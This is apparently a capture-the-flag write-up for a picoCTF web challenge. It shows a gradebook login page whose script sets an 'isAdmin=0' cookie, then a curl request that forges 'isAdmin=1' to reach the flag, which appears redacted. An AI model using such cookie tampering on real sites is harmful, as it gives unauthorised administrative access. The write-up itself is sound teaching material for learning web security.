## Description
Can you get the flag? Go to this website and see what you can discover.

## Solution

Viewing source code:
```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Secure Log In</title>
  </head>
  <body>
    <script src="guest.js"></script>

    <h1>Online Gradebook</h1>
    <button type="button" onclick="continueAsGuest();">Continue as guest</button>
  </body>
</html>
```

and `guest.js` is:
```javascript
function continueAsGuest()
{
  window.location.href = '/check.php';
  document.cookie = "isAdmin=0";
}
```

changing header cookie and get the flag:
```bash
curl "http://saturn.picoctf.net:57741/check.php" --header "Cookie: isAdmin=1"




<html>
<body>



<p>picoCTF{XXXXXXX}</p>


</body>
</html>
```
